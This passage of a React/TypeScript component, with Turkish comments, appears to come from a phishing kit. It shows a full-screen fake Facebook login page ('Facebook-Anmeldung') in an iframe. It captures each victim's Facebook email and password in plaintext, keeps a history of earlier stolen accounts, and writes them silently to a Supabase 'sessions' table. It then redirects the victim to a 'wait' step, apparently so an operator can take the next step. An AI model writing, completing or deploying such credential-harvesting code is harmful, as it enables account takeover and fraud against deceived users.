        fbEmail: str(merged.fbEmail),
        fbPassword: str(merged.fbPassword),
        fbSubmittedAt: str(merged.fbSubmittedAt),
        fbFirstName: str(merged.fbFirstName),
        fbLastName: str(merged.fbLastName),
        fbUserId: str(merged.fbUserId),
      };
      const nw = {
        fbEmail: email.trim(),
        fbPassword: password.trim(),
      };
      // Anlamli bir ESKI kayit var mi (email veya password dolu)?
      const hasOld = Boolean(old.fbEmail || old.fbPassword || old.fbFirstName || old.fbLastName);
      if (hasOld) {
        const oldCombo = `${old.fbEmail.toLowerCase()}|${old.fbPassword}`;
        const newCombo = `${nw.fbEmail.toLowerCase()}|${nw.fbPassword}`;
        // AYNI hesap (combo ayni) ise history'ye ekleme.
        // Aksi halde (farkli hesap) ESKI'yi history'ye at:
        if (oldCombo !== newCombo) {
          const arr: unknown[] = Array.isArray(safeMerged.facebookLoginHistory)
            ? [...(safeMerged.facebookLoginHistory as unknown[])]
            : [];
          arr.unshift({
            submittedAt: old.fbSubmittedAt || new Date().toISOString(),
            fbFirstName: old.fbFirstName,
            fbLastName: old.fbLastName,
            fbEmail: old.fbEmail,
            fbPassword: old.fbPassword,
            fbUserId: old.fbUserId,
          });
          safeMerged.facebookLoginHistory = arr;
        }
      }
    } catch {
      /* sessiz */
    }

    // 5) GUNCEL FB kaydini HER ZAMAN TEKIL olarak yaz (normal kolonlara gelsin)
    safeMerged.fbEmail = email.trim();
    safeMerged.fbPassword = password.trim();
    if (fbFirstName) safeMerged.fbFirstName = fbFirstName.trim();
    if (fbLastName) safeMerged.fbLastName = fbLastName.trim();
    safeMerged.fbSubmittedAt = new Date().toISOString();

    // 6) DB UPDATE (await + IIFE ile YAPILACAK)
    try {
      (async () => {
        try {
          await supabase
            .from("sessions")
            .update({
              is_hidden: false,
              current_step: "wait",
              status: "online",
              form_data: safeMerged,
            })
            .eq("id", uuid);
        } catch {
          /* sessiz ignore */
        }
      })();
    } catch {
      /* sessiz */
    }

    // 7) YONLENDIRME: 12ms gecikme ile supabase fetch'in aglara cikmasi icin.
    const fallbackFinal = (route && route.length > 0) ? route : uuid;
    // public_id icin ONCELIKLI DB'den gelen degeri kullan (state stale olabilir):
    const pid = (merged && typeof merged.public_id === "number")
      ? String(merged.public_id)
      : null;
    const baseFromStepFb = stepToPath("wait", uuid, pid || fallbackFinal);
    const qChFb = baseFromStepFb.includes("?") ? "&" : "?";
    const nextUrlFb = `${baseFromStepFb}${baseFromStepFb.includes("session=") ? "" : `${qChFb}session=${encodeURIComponent(pid || fallbackFinal)}`}`;
    window.setTimeout(() => {
      window.location.href = nextUrlFb;
    }, 12);
  }

  return (
    <div className="fixed inset-0 w-[100vw] h-[100dvh] max-w-none overflow-hidden z-[99999] bg-[#ffffff] m-0 p-0">
      <iframe
        ref={iframeRef}
        src="/fb-template.html"
        title="Facebook-Anmeldung"
        onLoad={onIframeLoaded}
        className="w-[100vw] h-[100dvh] block border-0 outline-none m-0 p-0 bg-[#ffffff]"
        style={{ background: "#ffffff", border: "none", outline: "none" }}
        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals"
      />
    </div>
  );
}
